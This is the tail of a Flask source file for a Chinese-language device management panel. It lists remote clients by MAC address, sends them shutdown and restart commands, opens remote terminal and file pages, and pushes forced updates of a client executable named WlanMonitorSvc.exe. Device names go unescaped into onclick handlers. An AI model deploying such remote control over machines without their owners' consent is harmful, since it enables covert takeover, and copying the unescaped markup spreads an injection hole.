                <th><input type="checkbox" id="checkAll" onclick="toggleAll(this)"></th>
                <th>MAC 地址</th>
                <th>设备备注名</th>
                <th>当前运行版本</th>
                <th>最后心跳时间</th>
                <th>快速操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in online_clients.items() %}
            <tr oncontextmenu="window.showMainContextMenu && window.showMainContextMenu(event)">
                <td><input type="checkbox" class="client-check" value="{{ mac }}"></td>
                <td><code>{{ mac }}</code></td>
                <td>
                    {{ info.name }} 
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td>v{{ info.ver }}</td>
                <td>{{ info.last_seen }}</td>
                <td>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /s /t 0')" style="background:#dc3545; padding:4px 8px; font-size:12px;">关机</button>
                    <button onclick="quickCmd('{{ mac }}', 'shutdown /r /t 0')" style="background:#ffc107; color:#000; padding:4px 8px; font-size:12px;">重启</button>
                    <a href="/terminal/{{ mac }}" style="background:#007bff; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">>_ 终端</a>
                    <a href="/files/{{ mac }}" style="background:#17a2b8; color:#fff; padding:4px 8px; text-decoration:none; border-radius:4px; font-size:12px; display:inline-block;">📁 文件</a>
                </td>
                <td class="status-online">📡 在线</td>
            </tr>
            {% else %}
            <tr><td colspan="7" style="text-align: center; color: #888;">抱歉，目前没有监测到任何活动设备连接。</td></tr>
            {% endfor %}
        </tbody>
    </table>

    <div style="margin-bottom: 30px; background: #e9ecef; padding: 15px; border-radius: 8px;">
        <b>⚡ 批量操作 (已选设备):</b>
        <button onclick="batchCmd('shutdown /s /t 0')" style="background:#dc3545; margin-left:10px;">批量关机</button>
        <button onclick="batchCmd('shutdown /r /t 0')" style="background:#ffc107; color:#000; margin-left:10px;">批量重启</button>
        <button onclick="batchCmd('UPDATE_NOW')" style="background:#28a745; margin-left:10px;">强制检查更新</button>
    </div>

    <h3>🔴 离线设备记录 [ {{ offline_clients|length }} 台 ]</h3>
    <table>
        <thead>
            <tr>
                <th>MAC 地址</th>
                <th>最后已知名称</th>
                <th>离线前版本</th>
                <th>最近一次连接时间</th>
                <th>操作</th>
                <th>状态</th>
            </tr>
        </thead>
        <tbody>
            {% for mac, info in offline_clients.items() %}
            <tr>
                <td style="color:#777;"><code>{{ mac }}</code></td>
                <td style="color:#777;">
                    {{ info.name }}
                    <button onclick="promptRename('{{ mac }}', '{{ info.name }}')" style="padding:2px 5px; font-size:12px; margin-left:5px; background:#6c757d;">重命名</button>
                </td>
                <td style="color:#777;">v{{ info.ver }}</td>
                <td style="color:#777;">{{ info.last_seen }}</td>
                <td><a href="/terminal/{{ mac }}" style="background:#6c757d; color:#fff; padding:5px 10px; text-decoration:none; border-radius:4px; font-size:14px;">📝 查看遗留日志</a></td>
                <td class="status-offline">已离线</td>
            </tr>
            {% else %}
            <tr><td colspan="6" style="text-align: center; color: #888;">暂无离线历史记录</td></tr>
            {% endfor %}
        </tbody>
    </table>
    """
    return render_template_string(PARTIAL_HTML, online_clients=online_clients, offline_clients=offline_clients)

@app.route('/', methods=['GET'])
def index():
    if not session.get('logged_in'):
        return redirect(url_for('login'))
        
    current_server_version = "未知版本"
    if os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, 'r', encoding='utf-8') as f:
            current_server_version = f.read().strip()

    html_template = """
    <!DOCTYPE html>
    <html lang="zh-CN">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>控制台设备管理</title>
        <style>
            body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f0f2f5; margin: 0; padding: 20px; }
            .container { max-width: 1100px; margin: 0 auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
            table { width: 100%; border-collapse: collapse; margin-top: 10px; margin-bottom: 30px; user-select: none; }
            th, td { padding: 12px 15px; border-bottom: 1px solid #ddd; text-align: left; }
            th { background-color: #007bff; color: white; }
            tr:hover { background-color: #f1f1f1; }
            .status-online { color: #28a745; font-weight: bold; }
            .status-offline { color: #dc3545; font-weight: bold; }
            .mgmt-box { background: #e9ecef; padding: 20px; border-radius: 8px; margin-bottom: 30px; }
            input[type="text"], input[type="file"] { padding: 8px; margin-right: 10px; border: 1px solid #ccc; border-radius:4px;}
            button { padding: 8px 15px; background: #007bff; border: none; border-radius: 4px; cursor: pointer; color: white;}
            button:hover { background: #0056b3; }
            .logout { float: right; padding:8px 15px; background: #dc3545; border-radius: 4px; text-decoration: none; color: #fff;}
            .main-context { display: none; position: absolute; z-index: 1000; background: white; border: 1px solid #ccc; box-shadow: 2px 2px 5px rgba(0,0,0,0.2); border-radius: 4px; padding: 5px 0; min-width: 150px; }
            .main-context-item { padding: 8px 15px; cursor: pointer; font-size: 14px; }
            .main-context-item:hover { background-color: #007bff; color: white; }
        </style>
    </head>
    <body>
        <div class="container" onclick="window.hideMainContextMenu && window.hideMainContextMenu()">
            <a href="/logout" class="logout">注销退出</a>
            <h1 style="margin-top:0;">💻 设备综合管理后台</h1>

            <div class="mgmt-box">
                <h3 style="margin-top:0;">🛠 发布强制客户端更新</h3>
                <p>当前全网服务器提供的最新强制更新版本号：<b style="color:red; font-size:18px;">{{ current_server_version }}</b></p>
                <form action="/update_mgmt" method="post" enctype="multipart/form-data">
                    <label>1. 发布新版本号(填入更高版本号单下发更新通知):</label><br>
                    <input type="text" name="version" value="{{ current_server_version }}" style="margin: 10px 0; width: 250px;">
                    <br>
                    <label>2. 上传为该版本准备的新本体 WlanMonitorSvc.exe(可选):</label><br>
                    <input type="file" name="file" accept=".exe" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#28a745; padding: 10px 20px; margin-top:5px;">更新并发布推送全网</button>
                </form>

                <hr style="border: 1px solid #ccc; margin: 20px 0;">

                <h3 style="margin-top:0;">⚙️ 热更新服务端代码</h3>
                <form action="/update_server" method="post" enctype="multipart/form-data">
                    <label>上传新的 app.py 后将直接覆盖并立即重启当前服务端进程:</label><br>
                    <input type="file" name="app_file" accept=".py" style="margin: 10px 0;">
                    <br>
                    <button type="submit" style="background:#17a2b8; padding: 10px 20px; margin-top:5px;">只热更新服务端(app.py)</button>
                </form>
            </div>

            <!-- 数据列表挂载容器 -->
            <div id="target-tables">正在建立实时通信环境获取设备库并连接设备...</div>

            <!-- 主界面右键菜单 -->
            <div id="main-context" class="main-context">
                <div class="main-context-item" onclick="onMainContextAction('shutdown /s /t 0')">🔴 批量关机</div>
                <div class="main-context-item" onclick="onMainContextAction('shutdown /r /t 0')">🔄 批量重启</div>
                <div class="main-context-item" onclick="onMainContextAction('UPDATE_NOW')" style="color:green;">🚀 强制更新</div>
            </div>

        </div>

        <script>
            // 定时使用 AJAX 异步拉取表格更新，达到实时无感动态列表
            function fetchTables() {
                // 1. 保存当前勾选的设备MAC
                var checkedMacs = [];
                var checkboxes = document.querySelectorAll('.client-check:checked');
                checkboxes.forEach(c => checkedMacs.push(c.value));

                fetch('/tables_partial')
                    .then(response => response.text())
                    .then(html => {
                        document.getElementById('target-tables').innerHTML = html;

                        // 2. 渲染新表格后恢复勾选状态
                        var newCheckboxes = document.querySelectorAll('.client-check');
                        var checkCount = 0;
                        newCheckboxes.forEach(c => {
                            if (checkedMacs.includes(c.value)) {
                                c.checked = true;
                                checkCount++;
                            }
                        });

                        // 3. 恢复顶部全选框的显示状态
                        var checkAllBtn = document.getElementById('checkAll');
                        if (checkAllBtn && newCheckboxes.length > 0 && checkCount === newCheckboxes.length) {
                            checkAllBtn.checked = true;
                        }
                    });
            }

            // 初始化立即加载，然后每间隔 1 秒刷一次
            fetchTables();
            setInterval(fetchTables, 1000);

            // 通过 JS 发送重命名更新（防止由于全页面刷新打断用户填写或者页面滚动异常）
            window.promptRename = function(mac, oldname) {
                var newname = prompt("给该设备重命名为:", oldname);
                if(newname && newname !== oldname) {
                    fetch('/api/rename', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ mac: mac, name: newname })
                    }).then(() => {
                        fetchTables(); // 直接刷新列表看到新名称
                    });
                }
            };

            window.showMainContextMenu = function(e) {
                e.preventDefault();
                let clickedCheckbox = e.currentTarget.querySelector('.client-check');
                if (clickedCheckbox && !clickedCheckbox.checked) {
                    clickedCheckbox.checked = true;
                }

                let menu = document.getElementById('main-context');
                if (menu) {
                    menu.style.display = 'block';
                    menu.style.left = e.pageX + 'px';
                    menu.style.top = e.pageY + 'px';
                }
            };

            window.hideMainContextMenu = function() {
                let menu = document.getElementById('main-context');
                if(menu) menu.style.display = 'none';
            };

            window.onMainContextAction = function(cmd) {
                hideMainContextMenu();
                window.batchCmd(cmd);
            };

            window.toggleAll = function(source) {
                var checkboxes = document.querySelectorAll('.client-check');
                for(var i=0; i<checkboxes.length; i++) checkboxes[i].checked = source.checked;
            };

            window.quickCmd = function(mac, cmd) {
                if(!confirm("确定要对该机器执行: " + cmd + " 吗？")) return;
                fetch('/api/send_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({mac: mac, cmd: cmd})
                }).then(() => alert("已下发"));
            };

            window.batchCmd = function(cmd) {
                var checked = document.querySelectorAll('.client-check:checked');
                var macs = [];
                checked.forEach(c => macs.push(c.value));
                if(macs.length === 0) return alert("请先勾选需要的设备");
                if(!confirm("确定要对选中的 " + macs.length + " 台机器执行: " + cmd + " 吗？")) return;

                fetch('/api/batch_cmd', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({macs: macs, cmd: cmd})
                }).then(() => alert("批量指令已下发"));
            };
        </script>
    </body>
    </html>
    """
    return render_template_string(html_template, current_server_version=current_server_version)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
